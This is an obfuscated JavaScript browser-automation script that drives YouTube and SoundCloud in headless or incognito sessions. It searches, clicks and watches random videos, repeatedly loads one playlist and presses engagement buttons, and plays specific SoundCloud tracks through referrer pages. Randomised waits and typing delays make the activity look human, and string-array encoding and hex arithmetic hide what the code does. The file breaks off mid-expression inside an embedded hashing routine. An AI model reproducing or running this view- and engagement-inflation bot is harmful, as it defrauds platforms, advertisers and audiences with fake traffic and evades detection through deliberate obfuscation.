const Y = b,
  X = c,
  W = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1eec + -0x200b + 0xd * 0x4d8))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1 * 0x3c5 + -0x1 * 0x26a9 + 0x22e4), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x27 * -0x119 + -0x6539 + 0x10538 + (0xca8 * 0x4 + -0x2edc + 0xdb5 * 0x4) * random()) : await standardWaitForNetIdle(f), await wait(0x1f22 + -0x57 * -0x71 + -0x3201 + (0x24 * 0x196 + -0x274d * -0x1 + 0xd * -0x469) * random()), 0x5 * 0x2a5 + -0x232d * -0x1 + 0x1 * -0x3065;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x3cb * -0x6 + 0xf4f + -0x1afb * -0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0xc6b + -0x6da + 0x1346;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0xaba * -0x1 + -0x1e8f + 0x13d5);
    let h = e[f];
    if (b['mOmaKa'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x121e + 0x1 * -0x1c01 + 0x1 * 0x9e3, s, t, u = 0x1ddd + 0xcf * -0x19 + -0x9a6; t = n['charAt'](u++); ~t && (s = r % (-0x200b + 0xb * -0x2c1 + -0x3e5a * -0x1) ? s * (-0x1 * -0x1b43 + 0x4b7 + -0x1fba) + t : t, r++ % (-0x10df * 0x1 + 0x59a + -0x1b * -0x6b)) ? p += String['fromCharCode'](0x2276 + 0x2501 * 0x1 + 0x4678 * -0x1 & s >> (-(-0x2695 + 0x1778 + 0x4f * 0x31) * r & -0x2e * -0x7 + 0x34 * 0x3e + 0x49c * -0x3)) : -0x1869 * -0x1 + 0x1 * 0xf71 + -0x27da) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1 * -0xf4f + -0x34b * -0x3 + -0x1930, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x6da + -0x1bae + -0xc * -0x2e2))['slice'](-(0x1449 + -0x24e9 + 0x10a2));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0xa8 * -0x28 + 0x12 * 0x1c1 + -0x39d2,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xecd + -0x23f * -0x11 + -0x34fc; u < -0x1 * 0x4f3 + -0x1 * 0x4a5 + -0x153 * -0x8; u++) {
          p[u] = u;
        }
        for (u = 0x6 * -0x1f3 + 0x15ee + -0x106 * 0xa; u < -0x1 * -0x18d7 + -0x60f + -0x11c8; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1fe1 + 0x1d95 * 0x1 + 0xda * -0x47), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * 0x1c57 + -0x262a + 0x5 * 0xd4d, q = 0xcb5 * -0x1 + 0x15f3 * -0x1 + -0x4 * -0x8aa;
        for (let v = 0x3 * -0x9f9 + 0x1262 + -0x1 * -0xb89; v < n['length']; v++) {
          u = (u + (0x464 + -0xace * -0x3 + -0x24cd)) % (-0x1221 + 0x1253 + 0xce), q = (q + p[u]) % (0x317 * 0x7 + 0x1 * -0x1705 + 0x264), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2055 + -0x2075 + 0x60 * 0x3)]);
        }
        return t;
      };
      b['JSztAw'] = m, c = arguments, b['mOmaKa'] = !![];
    }
    const j = e[-0x2 * -0xe8a + 0x4f9 * -0x5 + -0x437 * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['NIMjtf'] === undefined && (b['NIMjtf'] = !![]), h = b['JSztAw'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function randomWait() {
  return await wait(-0x20a4 * -0x1 + -0x972 + -0x3aa + (0x511 * -0x4 + 0x1a40 + 0x33 * 0x44) * random()), -0x1 * 0x1797 + -0x4ef * -0x3 + 0x8cb;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1 * 0x4f3 + -0x1 * 0x4a5 + -0x266 * -0x4, 0x6 * -0x1f3 + 0x15ee + -0x43 * 0x27), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x7 * -0x2a95 + -0x48b7 + 0x904) * getRandomInt(0x1fe1 + 0x1d95 * 0x1 + 0x19e * -0x26, -0x1 * 0x1c57 + -0x262a + 0xa * 0x6a7), h)), 0xcb5 * -0x1 + 0x15f3 * -0x1 + -0x13 * -0x1d3;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x3 * -0x9f9 + 0x1262 + -0x1 * -0xb89;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x464 + -0xace * -0x3 + -0x24cd]['split']('\x20');
    for (let k = -0x1221 + 0x1253 + -0x32; k < i['length']; k += 0x317 * 0x7 + 0x1 * -0x1705 + 0x166)
      j += i[k] * h[i[k + (0x2055 + -0x2075 + 0x21 * 0x1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2 * -0xe8a + 0x4f9 * -0x5 + -0x431 * 0x1)['map'](l => Array['from'](l['children']))['flat'](-0x1a7 + 0x9c * 0x1 + -0x10c * -0x1)['map'](l => l['childNodes'][0xac5 * 0x3 + -0x1f72 + -0xdc]['childNodes'][-0x208d + -0xb57 + 0x2be4]['childNodes'][-0x19aa + 0xc84 + 0x1 * 0xd27]['childNodes'][-0x585 + -0x2215 * -0x1 + -0x1c90]['childNodes'][0x53 * 0x1b + 0x169 * -0x13 + 0x120b]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', R(0xf, 'xo*K') + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xbf1 + -0x1 * 0x18f5 + 0x10ec, 0x15e + 0x7 * -0x3d1 + 0x2ce1 * 0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x7 * -0x34e + 0x1ad3 * -0x4 + -0x3 * -0x2f96);
  const h = await getMaxTime(f),
    i = Math['min']((0x80f0 * -0x2 + -0x724e + 0x25e8e) * getRandomInt(0x243 + 0x3 * 0xac1 + 0x8a1 * -0x4, 0xc0 * 0x34 + -0x1 * -0x9c1 + 0xc2f * -0x4), h);
  return await wait(i), -0x1880 + -0x154b + -0x2 * -0x16e6;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = c;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))[S(0x6)](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x2 * 0x350 + 0x5d0 + -0xc70]['children'][-0x6 * -0x1d2 + -0x1789 + 0xc9d]['children'][-0x1 * -0x1c3a + -0x12ae * 0x1 + -0x98c]['children'][-0x184e + -0x49 * 0x46 + 0x2c44]['children'][-0x1 * 0x232f + -0x224 * -0xd + 0x75b]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1aec * 0x1 + -0x3 * 0x1f7 + -0x1506;
}
async function searchAndView(f) {
  const T = b;
  log(T(0x7, 'rvqM') + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1c5 + 0xd0f * -0x1 + 0x12b * 0xa + (0x45 * 0x89 + -0x5 * -0x29f + -0x31d6) * random()
  }), await wait(-0x718 * -0x4 + 0x1d * -0xef + 0xa7 * 0x1 + (-0x3 * 0xc75 + -0xf02 + 0x1 * 0x358d) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x6f8 + 0x219c + 0x1e7 * -0xe]['childNodes'][-0x12b1 + 0x7a * 0x4e + -0x127a]['childNodes'][0x1419 + 0xbe9 * -0x1 + -0x82f]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1612 + -0xa * -0x395 + 0x1 * -0x39df]['childNodes'][0x1 * -0x1d0b + 0x144 + 0x1bc7]['childNodes'][0x10ad * 0x2 + 0x1fde + -0x4136]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x251c + 0x34e + 0x21cf * 0x1),
          r = 0x2516 + 0x2 * -0x413 + -0x1cf0;
        for (let u = 0x1f * 0xd0 + -0x161 * 0xe + -0x5e2; u < q['length']; u += -0xeed + -0x6 * -0x5ea + -0x148d)
          r += q[u] * k[q[u + (0x931 * -0x4 + -0x11a1 * 0x1 + 0x42 * 0xd3)]];
        return r;
      }(n);
  });
  await wait((0x3 * 0x2126 + 0x2 * -0x21a + -0x24a6) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x13c53 + 0x455b * -0x5 + 0x108d4) * getRandomInt(-0xb76 + -0x9 * -0x31b + 0x41f * -0x4, -0x611 * -0x5 + 0x269d + -0x44e8), h + (0x2153 + 0xa60 + -0x182b));
  return await wait(i), 0x1460 + -0x4aa * -0x8 + -0x39af;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0xaba * -0x1 + -0x1e8f + 0x13d5);
    let h = e[f];
    if (c['TJzUbs'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x121e + 0x1 * -0x1c01 + 0x1 * 0x9e3, r, s, t = 0x1ddd + 0xcf * -0x19 + -0x9a6; s = m['charAt'](t++); ~s && (r = q % (-0x200b + 0xb * -0x2c1 + -0x3e5a * -0x1) ? r * (-0x1 * -0x1b43 + 0x4b7 + -0x1fba) + s : s, q++ % (-0x10df * 0x1 + 0x59a + -0x1b * -0x6b)) ? o += String['fromCharCode'](0x2276 + 0x2501 * 0x1 + 0x4678 * -0x1 & r >> (-(-0x2695 + 0x1778 + 0x4f * 0x31) * q & -0x2e * -0x7 + 0x34 * 0x3e + 0x49c * -0x3)) : -0x1869 * -0x1 + 0x1 * 0xf71 + -0x27da) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1 * -0xf4f + -0x34b * -0x3 + -0x1930, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x6da + -0x1bae + -0xc * -0x2e2))['slice'](-(0x1449 + -0x24e9 + 0x10a2));
        }
        return decodeURIComponent(p);
      };
      c['xXdAgm'] = i, b = arguments, c['TJzUbs'] = !![];
    }
    const j = e[-0xa8 * -0x28 + 0x12 * 0x1c1 + -0x39d2],
      k = f + j,
      l = b[k];
    return !l ? (h = c['xXdAgm'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1d2 * -0x8 + -0x3 * -0x789 + -0x1 * 0x252b), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xc5b * -0x1 + -0x152 + 0x1965 + (0xac * 0x1f + 0x891 + -0x197d) * Math['random']());
    });
  }, -0x20b * -0x2 + 0xed7 + 0x86b);
  await wait(-0x1 * -0x2739e + 0x9437 + 0x18c0b);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x99 * 0x3e + 0x19c08 + 0x6 * -0x23c9) * getRandomInt(0x211a + 0xbad + -0x2cc3, -0xe * -0x248 + -0x1c64 + 0x1 * -0x373)), clearInterval(h), 0x4b4 * 0x7 + 0x4a7 * 0x2 + -0x2a39;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1e4d * 0x1 + 0x20ca + -0x7 * 0x5b;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x422 + 0xecc + -0xaa9 * 0x1;
    await randomWait();
  }
  return 0x3c * -0x7d + -0x2 * -0xd3a + -0x3 * -0xf3;
}

function fetchRandomSC() {
  return Math['random']() <= -0x461 * -0x5 + -0x1 * -0x263b + -0x3c20 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x49 * 0x77 + 0x3c7 + -0x182 * -0x14 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xd1 * -0x2d + -0x1526 + -0xf97 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x63 * -0x16 + -0x3 * -0xac + -0xa86;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x7911 + -0xa * 0x1227 + 0xec3d + getRandomInt(-0x1 * -0x5257 + 0x3a02 + -0x1 * 0x51c1, 0x9926 + -0x3 * 0x21e3 + 0x41b3));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x5 * -0x1eb + 0x1 * 0x23c1 + -0x1 * 0x2d57), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x17e7 + -0x1e82 + 0x3669;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v[U(0x14, '1hA9')](0x101e * -0x2 + 0x1a53 * 0x1 + 0x59 * 0x11, -0x10cd * 0x2 + 0xba9 + 0x1623)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1800 + -0x2145 * -0x1 + 0x1 * -0x3175 + floor((-0x26e9 * 0x1 + -0x106 * 0xd + -0x1 * -0x381f) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xc * 0x129df78a + -0x4696122c + -0x78d7 * 0x3494),
          0x115 * 0xd921 + -0xad * 0x1175b + -0x2a6 * -0x1ee7,
          0x2 * 0x4e31 + 0x11 * -0xc27 + 0xb235,
          0x79f + 0x810 + -0xf2f
        ], y = [
          -0x3 * 0x4e1 + -0xf53 + 0x1e0e,
          -0x194 + -0x2 * 0x30b + 0x7ba,
          0xffe + 0x216f + 0x5 * -0x9e1,
          0x33b * 0x8 + 0x8 * -0x9d + 0x2 * -0xa78
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x17c * -0xd + 0x698 * 0x1 + -0x19e3 * 0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1 * 0x1c1e + 0x1ffb + -0x3dd * 0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x5 * -0x76d + -0x4 * -0x7b5 + 0x1 * -0x43f5) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1 * -0xb8 + -0x3 * 0xb47 + 0x211d] = A[0xb * 0x15b + -0x1 * 0x4c0 + -0xa19] = A[0x6bb * 0x1 + -0x9f * -0x3 + 0x1 * -0x897] = A[0x22e + 0x556 * -0x4 + -0x3 * -0x664] = A[0x22 * 0xed + -0x1 * -0xa3b + -0x6 * 0x6f3] = A[-0x319 + 0x1 * -0x1bd9 + 0x1ef6] = A[-0x13 * 0x71 + -0xbcd + 0x1435] = A[-0x472 + -0x1851 + -0x1cc9 * -0x1] = A[0x22f1 * 0x1 + 0x64a + -0x2934] = A[0xe * 0x209 + -0x873 + -0x1403] = A[0x1f0c + 0x267b * -0x1 + 0x778] = A[0x2334 + 0x2 * 0x31d + -0x3 * 0xdcc] = A[0x2 * -0xd2d + 0x1256 + 0x80f] = A[-0x40 * 0x8b + 0x7f5 + 0x1ad7 * 0x1] = A[0x1 * 0xeca + -0x550 + -0x96d * 0x1] = A[0x25 * -0xeb + 0x20a2 + 0x163] = A[-0x22af + -0xb40 + -0x7 * -0x692] = -0x943 + -0x1 * -0x1c71 + -0x132e, this['blocks'] = A) : this['blocks'] = [
                0x1 * -0x11d7 + 0x19ee + -0x817,
                -0xc5c * 0x1 + 0x9a3 * 0x2 + -0x6ea,
                0x2155 + 0x1 * -0x2692 + 0x53d,
                0x11ce + -0x24e1 + 0x1313,
                -0x1b17 + -0x7 * -0x265 + 0xa54,
                0x1 * -0xad5 + -0x1 * 0x3a9 + 0xe * 0x109,
                0x1b65 + -0xc35 + -0x10 * 0xf3,
                0x1 * 0x6e8 + -0x299 * -0x1 + -0x981,
                0x212f + -0xf2e + -0x1201,
                0x1343 + 0x35b * 0x6 + -0x2765,
                -0x67 * 0x44 + -0x20eb + 0x3c47,
                0x5bb * -0x5 + -0x3 * 0x6d3 + -0x20 * -0x189,
                0x1f29 * -0x1 + 0x25cc + 0x1 * -0x6a3,
                0x1797 + 0x4a8 + -0x1c3f,
                -0x1 * -0x1171 + 0x1713 + -0x4 * 0xa21,
                -0x1 * 0x26e0 + 0xf3 * -0x7 + 0x2d85,
                -0x11 * -0xd6 + -0x13c * -0x2 + -0x10ae
              ], this['h0'] = 0x1 * 0x13175b9 + 0x5ab52d7a * 0x2 + -0x4f56adac, this['h1'] = -0xb * -0x497cd9f + 0x1277c1766 * 0x1 + -0xb66 * 0x95143, this['h2'] = -0xdd96f11e + 0x7cf8 * -0x1dcfd + 0xa2dac * 0x3ba7, this['h3'] = 0x62d9781 * 0x4 + 0x16aa2015 + -0xb03 * 0x2d4e1, this['h4'] = 0x87fde1 * 0x5 + -0x4a304784 + 0xb9f * 0x170191, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1a37 + -0xbc * 0x27 + 0x26d, this['finalized'] = this['hashed'] = 0x18b8 + 0x22fd + -0x3bb5, this['first'] = 0x9bb * -0x1 + 0x25a4 + -0x1be8;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x648 * -0x1 + 0x2665 * -0x1 + 0x201d, O = J['length'] || 0x71a * 0x3 + -0x2562 + 0x1014, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x38 * 0x76 + -0x197e + 0x6 * 0x88d, P[-0x254f + 0x1ad1 + 0xa7e] = this['block'], P[0xa87 + -0xb06 + 0x8f] = P[-0xce5 * -0x1 + 0x109d + 0x1 * -0x1d81] = P[-0x1675 + 0x1183 * -0x1 + 0xe * 0x2db] = P[0x15b2 * -0x1 + 0x218f + -0xbda * 0x1] = P[0x60d * 0x3 + 0x57c + -0x1 * 0x179f] = P[-0xc7 * -0x26 + -0x15a + 0x1c2b * -0x1] = P[0x1 * 0x1689 + 0x7f6 + -0x1e79] = P[-0xd7b + 0x8 * -0x270 + -0x28a * -0xd] = P[-0x11e5 + 0x955 * 0x2 + -0xbd] = P[0x2064 + 0x140f + -0x346a] = P[-0x1488 + 0x1 * -0x1567 + 0x29f9] = P[0x1c3 + -0x2 * 0x2a7 + 0x396] = P[0x1216 + 0x1a0e + -0x2c18] = P[0x1 * -0x13ae + 0x24cd + -0x1112] = P[0x27 * -0x6b + 0xb41 * -0x2 + -0x26dd * -0x1] = P[-0xe82 + -0x1 * -0x1795 + 0x904 * -0x1] = 0x4 * -0x6d0 + 0x3d * 0x3e + 0xc7a), K) {
                    for (N = this['start']; M < O && N < -0x107b + 0x1708 + -0x64d; ++M)
                      P[N >> -0xb9 + 0x72 * 0x2c + -0x12dd] |= J[M] << y[-0xa16 + 0x12a * 0x16 + -0x169 * 0xb & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1 * 0x1ad2 + 0x259a + -0x402c; ++M)
                      (L = J['charCodeAt'](M)) < 0x11ea + 0x2692 + 0x2 * -0x1bfe ? P[N >> -0x2 * -0x1205 + 0x17eb + 0x67 * -0x95] |= L << y[-0x1da8 + -0x395 * 0x2 + 0x24d5 & N++] : L < 0x227b + -0x1080 + -0x16d * 0x7 ? (P[N >> 0x39 * -0x50 + 0x1861 + -0x17 * 0x49] |= (0x52f * -0x5 + 0x5 * 0x66b + -0x56c | L >> 0x199 * -0x7 + 0x1284 + -0x74f * 0x1) << y[-0x251 * -0x1 + -0x7d1 + 0x1 * 0x583 & N++], P[N >> -0x8 * 0x89 + 0x3 * 0x6ec + -0x107a] |= (-0x225f + -0x7 * -0x115 + -0xda6 * -0x2 | 0x1 * -0x15dc + -0x2583 + 0x3b9e & L) << y[0x1c2 * -0x10 + 0x7e * 0x11 + 0x13c5 & N++]) : L < -0x1068a + 0xb6a4 + 0x127e6 || L >= -0x92c7 + -0xbf * 0x161 + -0x3a5 * -0xae ? (P[N >> -0xb58 + 0x1357 + -0x7fd] |= (0x298 + 0x258 + 0x208 * -0x2 | L >> -0x2 * 0x223 + -0x1 * -0x1499 + -0x56d * 0x3) << y[-0x8 * -0x412 + -0xa8f + -0x1 * 0x15fe & N++], P[N >> -0x723 * -0x3 + 0x3 * 0x309 + 0x1 * -0x1e82] |= (-0x205c + 0x1ee4 + 0x1f8 | L >> -0xd * -0xea + 0x1146 + -0x21 * 0xe2 & 0x77e + 0xc2e * 0x3 + -0x2bc9) << y[-0x6 * -0x25c + 0x1 * -0xabb + -0x36a & N++], P[N >> -0x1a17 + 0x13af * -0x1 + 0x494 * 0xa] |= (-0xf97 * -0x1 + -0x13c2 + -0xef * -0x5 | -0x258e + 0x11 * -0xe5 + 0x3502 & L) << y[0xbc5 * 0x1 + -0x3d1 + -0x7f1 * 0x1 & N++]) : (L = -0xe42c + 0x1e3fa + -0x1 * -0x32 + ((0x3 * 0x9cf + 0x18 * 0x15d + 0x9 * -0x676 & L) << 0x2 * -0x391 + 0x20e9 + -0x19bd * 0x1 | 0x12ca + 0x2 * 0x59d + -0x1a05 & J['charCodeAt'](++M)), P[N >> 0x1 * 0x6c5 + 0x73 * -0x16 + -0x1 * -0x31f] |= (-0x455 * -0x1 + 0x1b * -0x4d + -0x5 * -0xf2 | L >> -0x234f + 0xc67 + 0x16fa) << y[0xb * -0xd3 + 0x8e * 0x43 + 0x2cf * -0xa & N++], P[N >> 0x1c3 * 0x3 + -0x4ce + 0x79 * -0x1] |= (-0x565 + -0xee8 + 0x14cd | L >> 0x6f8 + 0x12d0 + -0x6 * 0x44a & -0x1824 + 0xb3 * 0x1 + 0x17b0) << y[-0x1e75 + -0x501 * -0x7 + -0x48f & N++], P[N >> 0x388 + 0x1dbb + 0x2141 * -0x1] |= (0x356 + 0x25 * -0x7a + -0x3b3 * -0x4 | L >> -0x21fe + -0x1f66 + 0x416a & 0x424 + -0xf24 + 0xb3f) << y[0x17b8 + 0x1a3a * -0x1 + 0x285 * 0x1 & N++], P[N >> -0x163b + -0x1ded + 0x342a] |= (-0x13d * -0x1f + 